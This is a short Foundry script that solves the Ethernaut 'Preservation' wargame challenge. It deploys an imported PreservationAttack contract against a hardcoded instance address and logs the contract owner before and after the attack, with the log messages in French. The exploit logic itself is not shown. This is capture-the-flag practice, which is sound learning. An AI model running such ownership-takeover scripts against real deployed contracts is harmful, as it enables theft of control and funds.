// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/PreservationAttack.sol"; // 1) add file

contract SolvePreservation is Script { // 2) change contractName

    function run() external {

        address target = 0x3B04B03b5D494266427015114e5D4179C2359Dc7; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        PreservationAttack attacker = new PreservationAttack(target);
        console.log("Le owner avant est :", IPreservation(target).owner());
        attacker.attack();
        console.log("Le owner apres est :", IPreservation(target).owner());

        vm.stopBroadcast();

    }
}